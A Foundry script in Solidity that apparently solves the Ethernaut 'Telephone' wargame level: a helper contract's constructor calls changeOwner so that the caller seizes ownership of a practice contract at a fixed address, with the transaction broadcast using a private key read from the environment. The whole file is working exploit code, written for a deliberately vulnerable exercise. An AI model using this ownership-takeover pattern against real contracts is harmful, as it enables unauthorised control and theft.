// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract Player {
    constructor(Telephone telephone) {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneHack is Script {
    Telephone public telephone =
        Telephone(payable(0x2253b86862dd9b0D65d551Cf0C5cb3ECD1f36fbc));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before hack", telephone.owner());
        new Player(telephone);
        console.log("Owner after hack", telephone.owner());

        vm.stopBroadcast();
    }
}

// forge script script/Telephone.s.sol -vv --tc TelephoneHack
// forge script script/Telephone.s.sol -vv --tc TelephoneHack --broadcast
